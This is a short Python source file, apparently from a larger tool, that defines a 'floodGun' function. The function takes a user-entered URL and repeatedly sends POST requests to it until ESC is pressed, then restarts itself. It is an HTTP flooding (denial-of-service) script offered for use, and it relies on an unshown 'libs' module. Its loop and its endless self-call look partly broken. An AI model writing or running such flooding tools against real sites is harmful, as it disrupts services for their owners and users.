import keyboard
import libs


def floodGun():
    libs.iFace.menuHead()
    libs.iFace.entURL()
    print('After, press ESC to stop flooding')
    print('')

    target = libs.URL.urlSet(libs.URL.urlInput(''), 'post', '', libs.URL.headers(), '', libs.URL.body())

    while True:
        print(f'>> Sending POST request on: {target.url}')
        target
        libs.URL.respCode(target)
        if keyboard.is_pressed('esc'):
            print(">> Flooding stopped")
            break
    
    libs.iFace.keyBack()
    floodGun()
